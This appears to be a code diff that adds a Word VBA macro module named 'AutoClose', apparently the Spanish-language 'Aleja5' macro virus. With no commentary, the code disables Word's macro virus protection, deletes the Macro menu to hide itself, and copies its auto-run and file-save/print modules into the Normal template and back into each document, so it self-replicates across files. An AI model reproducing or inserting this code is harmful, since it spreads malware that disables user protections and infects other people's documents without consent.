@@ -1,0 +1,45 @@
+Attribute VB_Name = "AutoClose"
+Sub MAIN()
+On Error Resume Next
+Options.VirusProtection = False
+CommandBars("Tools").Controls("Macro").Delete
+Dim modulo(6) As String
+Dim n As Integer
+Version = GetSetting(appname:="Aleja5", Section:="Inicio", _
+                       Key:="Version", Default:="2")
+If Version <= 2 Then
+SaveSetting appname:="Aleja5", Section:="Inicio", _
+                Key:="Version", setting:=2
+n = 6
+modulo(1) = "AutoClose"
+modulo(2) = "AutoOpen"
+modulo(3) = "ArchivoGuardar"
+modulo(4) = "ArchivoGuardarComo"
+modulo(5) = "ArchivoImprimir"
+modulo(6) = "ArchivoImprimirPredeter"
+For m = 1 To n
+existe = False
+For Each VBComponent In NormalTemplate.VBProject.VBComponents
+    If VBComponent.Name = modulo(m) Then
+            existe = True
+    End If
+Next VBComponent
+If Not existe Then
+        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
+            Destination:=NormalTemplate.FullName, Name:=modulo(m), _
+            Object:=wdOrganizerObjectProjectItems
+End If
+existe = False
+For Each VBComponent In ActiveDocument.VBProject.VBComponents
+    If VBComponent.Name = modulo(m) Then
+            existe = True
+    End If
+Next VBComponent
+If Not existe Then
+        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
+            Destination:=ActiveDocument.FullName, Name:=modulo(m), _
+            Object:=wdOrganizerObjectProjectItems
+End If
+Next
+End If
+End Sub
